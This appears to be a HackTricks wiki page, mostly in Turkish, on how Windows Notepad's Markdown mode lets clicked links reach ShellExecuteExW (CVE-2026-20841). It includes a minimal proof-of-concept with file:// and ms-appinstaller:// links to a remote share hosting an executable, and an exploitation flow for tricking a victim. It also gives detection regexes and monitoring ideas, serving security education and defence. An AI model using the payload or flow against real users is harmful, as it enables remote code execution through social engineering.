# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows applications that render Markdown/HTML, kullanıcı tarafından sağlanan linkleri genellikle tıklanabilir öğelere dönüştürür ve bunları `ShellExecuteExW`'ye iletir. Strict scheme allowlisting uygulanmadığında, kayıtlı herhangi bir protocol handler (ör. `file:`, `ms-appinstaller:`) tetiklenebilir ve bu da mevcut kullanıcı bağlamında code execution'a yol açabilir.<sup>[[1]](#references)</sup>

## Windows Notepad Markdown mode içindeki ShellExecuteExW surface
- Notepad, Markdown mode'u **yalnızca `.md` uzantıları** için `sub_1400ED5D0()` içindeki sabit bir string comparison aracılığıyla seçer.<sup>[[1]](#references)</sup>
- Desteklenen Markdown linkleri:
- Standard: `[text](target)`
- Autolink: `<target>` (`[target](target)` olarak render edilir); bu nedenle her iki syntax da payload'lar ve detection'lar için önemlidir.
- Link tıklamaları, weak filtering uyguladıktan sonra `ShellExecuteExW`'yi çağıran `sub_140170F60()` içinde işlenir.
- `ShellExecuteExW`, yalnızca HTTP(S) ile sınırlı olmaksızın **yapılandırılmış herhangi bir protocol handler'a** dispatch eder.<sup>[[1]](#references)</sup>

### Payload considerations
- Link içindeki tüm `\\` sequence'leri, `ShellExecuteExW`'den **önce `\` olarak normalize edilir**; bu durum UNC/path crafting ve detection'ları etkiler.
- `.md` dosyaları varsayılan olarak Notepad ile associate edilmez; victim'ın dosyayı Notepad'de açması ve linke tıklaması yine gerekir, ancak render edildikten sonra link tıklanabilir olur.
- Dangerous example scheme'ler:<sup>[[1]](#references)</sup>
- Local/UNC payload başlatmak için `file://`.
- App Installer flow'larını tetiklemek için `ms-appinstaller://`. Yerel olarak kayıtlı diğer scheme'ler de abuse edilebilir.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Notepad'in Markdown olarak görüntülemesi için bir **`.md` dosyası** oluşturun.
2. Tehlikeli bir URI scheme (`file:`, `ms-appinstaller:` veya yüklü herhangi bir handler) kullanarak bir bağlantı ekleyin.
3. Dosyayı (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB veya benzeri) iletin ve kullanıcıyı dosyayı Notepad'de açmaya ikna edin.
4. Tıklama üzerine **normalize edilmiş bağlantı**, `ShellExecuteExW` işlevine aktarılır ve ilgili protocol handler, başvurulan içeriği kullanıcının context'i içinde çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- Belgeleri yaygın olarak ileten portlar/protokoller üzerinden `.md` dosyalarının aktarımını izleyin: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown bağlantılarını (standart ve autolink) ayrıştırın ve **büyük/küçük harfe duyarsız** `file:` veya `ms-appinstaller:` ifadelerini arayın.
- Uzak resource access'i yakalamak için vendor-guided regex'ler:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Patch davranışının bildirildiğine göre **yerel dosyaları ve HTTP(S)** allowlist'e aldığı; `ShellExecuteExW` işlevine ulaşan diğer her şeyin şüpheli olduğu belirtiliyor. Sistemler arasındaki attack surface farklılık gösterebileceğinden, gerektiğinde algılamaları diğer yüklü protocol handler'lara da genişletin.<sup>[[1]](#references)</sup>

## Referanslar
- [1] [CVE-2026-20841: Windows Notepad'de Arbitrary Code Execution](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
